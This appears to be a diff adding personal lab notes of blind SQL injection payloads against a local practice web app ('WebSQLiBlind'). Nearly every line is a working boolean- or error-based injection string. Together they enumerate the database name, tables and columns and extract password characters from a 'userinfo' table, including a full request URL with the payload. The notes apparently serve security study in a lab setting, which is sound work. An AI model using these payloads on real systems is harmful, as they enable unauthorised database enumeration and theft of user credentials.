@@ -1,0 +1,23 @@
+//dbblindsqp
+1' AND SUBSTRING((SELECT DATABASE()), 1, 1) = 'd' --
+
+//2 column
+1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'dbblindsql') = N --
+
+//Name column (userinfo)
+1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = 'dbblindsql' LIMIT 1,1), 1, 1) = 'a' -- -
+
+//Name column (product)
+1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = 'dbblindsql' LIMIT 0,1), 1, 1) = 'a' -- -
+
+//Number of column(userinfor (id,username,password)
+1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema = 'dbblindsql' AND table_name = 'userinfo') = 3 -- -
+
+//Name column	
+1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = 'dbblindsql' AND table_name = 'userinfo' LIMIT 0,1), 1, 1) = 'i' -- -	
+
+//End
+http://localhost:8080/WebSQLiBlind/ProductDetail?id=1' AND SUBSTRING((SELECT password FROM userinfo LIMIT 2,1), 2, 1) = '2' -- -
+
+//Error
+1' AND (SELECT CASE WHEN (SUBSTRING((SELECT DATABASE()), 0, 1) = 'd') THEN 1/0 ELSE 'd' END)='d' -- -
